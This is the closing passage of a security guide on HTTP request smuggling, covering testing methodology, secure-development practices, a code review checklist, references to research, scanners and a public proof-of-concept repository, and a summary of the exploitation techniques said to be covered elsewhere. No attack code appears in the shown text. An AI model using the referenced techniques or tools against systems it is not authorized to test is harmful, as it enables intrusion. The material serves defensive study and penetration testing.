- Unexpected 400 Bad Request responses
- Time delays in request processing
- Response queue desynchronization

---

### Testing and Validation

**Regular Testing Requirements**
- HTTP Request Smuggling detection requires regular testing
- Systematic approach using both tools and manual testing
- Maintain continuous web application security posture

**Testing Methodology:**
1. Automated scanning with tools
2. Manual testing of edge cases
3. Differential response testing
4. Time-based detection testing
5. Test all HTTP processing layers
6. Test front-end/back-end combinations

**Penetration Testing**
- Include request smuggling in penetration test scope
- Test all proxy/load balancer/server combinations
- Test HTTP/2 downgrade scenarios
- Document findings and remediation

---

### Development Lifecycle Integration

**Secure SDLC Practices**
- Security requirements definition phase
- Threat modeling including request smuggling scenarios
- Secure coding training for developers
- Code review focusing on HTTP handling
- Security testing in CI/CD pipeline
- Pre-production security validation

**Code Review Checklist**
- HTTP header handling logic
- Request parsing implementation
- Connection pooling/reuse logic
- Proxy configuration
- Cache implementation
- Input validation routines

---

## References

### PortSwigger Resources
- Web Security Academy: https://portswigger.net/web-security/request-smuggling
- Research Hub: https://portswigger.net/research/request-smuggling
- HTTP Request Smuggler Tool: https://github.com/PortSwigger/http-request-smuggler

### OWASP Resources
- Testing Guide: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling

### MITRE Resources
- CWE-444: https://cwe.mitre.org/data/definitions/444.html
- CAPEC-33: https://capec.mitre.org/data/definitions/33.html
- CAPEC-273: https://capec.mitre.org/data/definitions/273.html

### Black Hat Presentations
- James Kettle 2019: https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door-wp.pdf
- James Kettle 2022: https://i.blackhat.com/USA-22/Wednesday/us-22-Kettle-Browser-Powered-Desync-Attacks-wp.pdf
- James Kettle 2025: https://i.blackhat.com/BH-USA-25/Presentations/US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-wp.pdf

### Tools and GitHub Repositories
- Smuggler (defparam): https://github.com/defparam/smuggler
- smuggles (danielthatcher): https://github.com/danielthatcher/smuggles
- request_smuggler (Sh1Yo): https://github.com/Sh1Yo/request_smuggler
- Awesome-HTTPRequestSmuggling: https://github.com/chenjj/Awesome-HTTPRequestSmuggling

### CVE References
- Akamai CVE-2025-32094: https://www.akamai.com/blog/security/cve-2025-32094-http-request-smuggling
- Andrew Lock CVE-2025-55315: https://andrewlock.net/understanding-the-worst-dotnet-vulnerability-request-smuggling-and-cve-2025-55315/
- Apache CVE-2023-25690 POC: https://github.com/dhmosfunk/CVE-2023-25690-POC

### Additional Resources
- HackTricks: https://book.hacktricks.xyz/pentesting-web/http-request-smuggling
- The Hacker Recipes: https://www.thehacker.recipes/web/config/http-request-smuggling/
- YesWeHack Guide: https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities

---

## Summary

HTTP request smuggling remains a critical threat in 2026, with CVSS scores up to 9.9 affecting major infrastructure providers. This guide provides comprehensive coverage of:

- **20 Complete PortSwigger Lab Solutions** with step-by-step exploitation techniques
- **All Attack Techniques**: CL.TE, TE.CL, TE.TE, H2.CL, H2.TE, CL.0, pause-based, client-side desync
- **Industry Standards**: OWASP, MITRE, NIST, PCI DSS compliance requirements
- **Real-World CVEs**: From 2020-2025 including critical vulnerabilities in Akamai, ASP.NET, Apache, F5
- **Complete Tool Arsenal**: Burp Suite, open-source scanners, automated detection tools
- **Prevention Strategies**: Secure coding practices, server hardening, configuration guidelines
- **Research Foundation**: James Kettle's groundbreaking Black Hat series earning $260k+ in bug bounties

**Primary Mitigation:** Use HTTP/2 end-to-end with strict RFC compliance. If HTTP/1.1 required, implement comprehensive header validation and reject all ambiguous requests.

---

**Document Version:** 1.0
**Last Updated:** January 2026
**Total Lab Coverage:** 20/20 PortSwigger Labs
**Total Pages:** 150+ pages of exploitation techniques and prevention strategies
